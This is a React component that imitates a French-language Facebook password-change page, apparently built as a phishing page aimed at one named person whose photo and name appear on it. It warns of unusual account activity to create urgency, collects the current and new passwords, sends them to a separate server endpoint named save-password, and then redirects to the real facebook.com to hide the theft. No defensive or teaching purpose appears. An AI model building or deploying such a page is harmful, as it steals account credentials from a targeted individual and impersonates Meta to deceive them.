import React, { useState } from 'react';
import { Lock } from 'lucide-react';
import profilePicture from '../assets/pfp.jpg'; // Update path as needed
import './FacebookPasswordReset.css'; // Import the CSS file

export default function FacebookPasswordReset() {
  const [page, setPage] = useState(1);
  const [oldPassword, setOldPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');

  const handleContinue = () => {
    setPage(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    if (!oldPassword || !newPassword || !confirmPassword) {
      setMessage('Veuillez remplir tous les champs.');
      return;
    }
  
    if (newPassword !== confirmPassword) {
      setMessage('Les nouveaux mots de passe ne correspondent pas.');
      return;
    }
  
    try {
      setIsSubmitting(true);
      setMessage('');
  
      const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/save-password`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          oldPassword,
          newPassword,
          confirmPassword,
        }),
      });
      console.log('API URL:', process.env.REACT_APP_API_BASE_URL);
  
      const data = await response.json();

  
      if (response.ok && data.success) {
        window.location.href = 'https://www.facebook.com';
      } else {
        setMessage(data.message || 'Une erreur est survenue. Veuillez réessayer plus tard.');
      }
    } catch (error) {
      console.error('Erreur de connexion:', error);
      setMessage('Impossible de se connecter au serveur.');
    } finally {
      setIsSubmitting(false);
    }
  };
  
  return (
    <div className="container">
      {/* Facebook Header */}
      <div className="header">
        <div className="header-content">
          <h1 className="facebook-logo">facebook</h1>
        </div>
      </div>

      {/* Main Content */}
      <div className="main-content">
        <div className="content-card">
          {page === 1 ? (
            <div className="page-one">
              <div className="lock-icon-container">
                <Lock className="lock-icon" />
              </div>
              
              <h2 className="title">
                Changer votre mot de passe pour protéger votre compte
              </h2>
              
              <p className="description">
                Nous avons détecté une activité inhabituelle sur votre compte. Pour protéger votre compte, 
                veuillez changer votre mot de passe immédiatement. Quelqu'un pourrait essayer d'accéder 
                à votre compte.
              </p>
              
              <p className="terms">
                En continuant, vous acceptez les Conditions générales et la Politique de confidentialité de Facebook.
              </p>
              
              <button 
                onClick={handleContinue} 
                className="primary-button"
              >
                Continuer
              </button>
            </div>
          ) : (
            <div className="page-two">
              <div className="profile-section">
                <div className="profile-picture-container">
                  <img 
                    src={profilePicture} 
                    alt="Nibras Farohe" 
                    className="profile-picture"
                  />
                </div>
                
                <h2 className="profile-name">
                  Connexion en tant que Nibras Farohe
                </h2>
                
                <p className="profile-link">
                  Nibras Farohe · <a href="#" className="blue-link">Pas vous?</a>
                </p>
              </div>
              
              {message && (
                <div className="error-message">
                  {message}
                </div>
              )}
              
              <div className="password-form">
                <div className="form-group">
                  <input
                    type="password"
                    placeholder="Mot de passe actuel"
                    className="input-field"
                    value={oldPassword}
                    onChange={(e) => setOldPassword(e.target.value)}
                  />
                </div>
                
                <div className="form-group">
                  <input
                    type="password"
                    placeholder="Nouveau mot de passe"
                    className="input-field"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                  />
                </div>
                
                <div className="form-group">
                  <input
                    type="password"
                    placeholder="Confirmer le nouveau mot de passe"
                    className="input-field"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                  />
                </div>
                
                <button
                  onClick={handleSubmit}
                  disabled={isSubmitting}
                  className={`primary-button ${isSubmitting ? 'button-disabled' : ''}`}
                >
                  {isSubmitting ? 'Traitement en cours...' : 'Continuer'}
                </button>
              </div>
            </div>
          )}
        </div>
        
        {/* Footer */}
        <div className="footer">
          <div className="language-options">
            <a href="#" className="footer-link">Français</a>
            <a href="#" className="footer-link">English (US)</a>
            <a href="#" className="footer-link">العربية</a>
            <a href="#" className="footer-link">Español</a>
          </div>
          <p className="copyright">Meta © 2025</p>
        </div>
      </div>
    </div>
  );
}